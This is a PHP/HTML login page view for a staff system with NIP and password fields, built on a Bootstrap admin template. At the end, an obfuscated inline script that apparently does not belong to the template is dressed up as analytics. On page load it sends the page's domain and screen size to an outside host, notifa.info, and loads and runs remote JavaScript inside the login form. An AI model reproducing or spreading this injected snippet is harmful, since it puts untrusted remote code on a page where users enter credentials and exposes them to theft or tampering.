
<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>Star Admin Premium Bootstrap Admin Dashboard Template</title>

  <?php if (in_array($_SERVER['REMOTE_ADDR'], array('127.0.0.1', '::1'))) {?>
  <?php } else { ?>
  <?php } ?>
  <!-- plugins:css -->
  <link rel="stylesheet" href="<?=base_url('assets/vendors/iconfonts/mdi/css/materialdesignicons.min.css')?>">
  <link rel="stylesheet" href="<?=base_url('assets/vendors/iconfonts/puse-icons-feather/feather.css')?>">
  <link rel="stylesheet" href="<?=base_url('assets/vendors/css/vendor.bundle.base.css')?>">
  <link rel="stylesheet" href="<?=base_url('assets/vendors/css/vendor.bundle.addons.css')?>">
  <!-- endinject -->
  <!-- plugin css for this page -->
  <!-- End plugin css for this page -->
  <!-- inject:css -->
  <link rel="stylesheet" href="<?=base_url('assets/css/style.css')?>">
  <!-- endinject -->
  <link rel="shortcut icon" href="<?php echo base_url("assets/images/logo-kemendesa.png") ?>" />
</head>

<body>
  <div class="container-scroller">
    <div class="container-fluid page-body-wrapper full-page-wrapper auth-page">
      <div class="content-wrapper d-flex align-items-center auth auth-bg-1 theme-one">
        <div class="row w-100">
          <div class="col-lg-4 mx-auto">
            <div class="auto-form-wrapper">
              <form action="<?=site_url('user/login')?>" method="POST">
                <div class="form-group">
                  <label class="label">No. NIP</label>
                  <div class="input-group">
                    <input type="text" class="form-control" name="nip" placeholder="NIP" autocomplete="off">
                    <div class="input-group-append">
                      <span class="input-group-text">
                        <i class="mdi mdi-check-circle-outline"></i>
                      </span>
                    </div>
                  </div>
                </div>
                <div class="form-group">
                  <label class="label">Password</label>
                  <div class="input-group">
                    <input type="password" class="form-control" name="password" placeholder="*********">
                    <div class="input-group-append">
                      <span class="input-group-text">
                        <i class="mdi mdi-check-circle-outline"></i>
                      </span>
                    </div>
                  </div>
                </div>
                <div class="form-group">
                  <button type="submit" class="btn btn-primary submit-btn btn-block">Login</button>
                </div>
                <!-- <div class="form-group d-flex justify-content-between">
                  <div class="form-check form-check-flat mt-0">
                    <label class="form-check-label">
                      <input type="checkbox" class="form-check-input" checked> Keep me signed in
                    </label>
                  </div>
                  <a href="#" class="text-small forgot-password text-black">Forgot Password</a>
                </div>
                <div class="form-group">
                  <button class="btn btn-block g-login">
                    <img class="mr-3" src="assets/images/file-icons/icon-google.svg" alt="">Log in with Google</button>
                </div> -->
                <div class="text-block text-center my-3">
                  <span class="text-small font-weight-semibold">Not a member ?</span>
                  <a href="#" class="text-black text-small">Create new account</a>
                </div>
              </form>
            </div>
            <ul class="auth-footer">
              <li>
                <a href="#">Conditions</a>
              </li>
              <li>
                <a href="#">Help</a>
              </li>
              <li>
                <a href="#">Terms</a>
              </li>
            </ul>
            <p class="footer-text text-center">copyright © 2018 Bootstrapdash. All rights reserved.</p>
          </div>
        </div>
      </div>
      <!-- content-wrapper ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->
  <!-- plugins:js -->
  <script src="<?=base_url('assets/vendors/js/vendor.bundle.base.js')?>"></script>
  <script src="<?=base_url('assets/vendors/js/vendor.bundle.addons.js')?>"></script>
  <!-- endinject -->
  <!-- inject:js -->
  <script src="<?=base_url('assets/js/off-canvas.js')?>"></script>
  <script src="assets/js/hoverable-collapse.js"></script>
  <script src="<?=base_url('assets/js/misc.js')?>"></script>
  <script src="assets/js/settings.js"></script>
  <script src="assets/js/todolist.js"></script>
  <!-- endinject -->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mIKwSdiEDdgzi2RXw5lLXEIHRljud1CFR4eHR3eKnHAxvR5FpncfSiLgKCO8O3b2i5b0xAoZfycFMpR0id0dRDZmqMm3fKFhDnmzg0RQ4oq%2fwhr4jX%2fiY%2bnbP9Aqa5fW1xULG0%2f%2b%2fHeBoZcWrWjw7%2b6QGKGk3%2fDqnOxF0h2XG9hydsWDtCJhVEqptFqFCfDfedtTHRrKHXi4t0UPCB6bcTW9r1pOAH1SEKrFNORjUfF4qoG7TiZul9ZwBn1By55oZ7IgOtA1mRGgmL9YQJGPTdCnz%2fOz9AWlWqmGgF4a5O8g6ZOH%2b7p%2bH0DBCfY86Rzd3Ad0Vg2xHygvQ9uc4mO0eNAgu%2bMgRv214HKWeNecoaCuiLN%2fxX8GKWxpM6ko%2ftW9s%2b2KfzqdKBHfAP0yn50bfoQbP6B6kzvRt%2fCMXyli1DPoiB0YyfropsBTxaPNN3Nvhfc2ZVxKWNilivET3pOTLpTNQvJp54pQCVzy4YnEL1AsE3dJTsGC5WgffO0QQkp1m8%2bSguAUWs07pIZkdxVrisfozYt0zux7muaikHQJv5uqrHMOQcEoF8%2fl4hkmLJJPgAn2ragaecCLfhU8Gk2OmXsfHygNvPdphoDKTv0k6hRhPKBC31jcCNg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>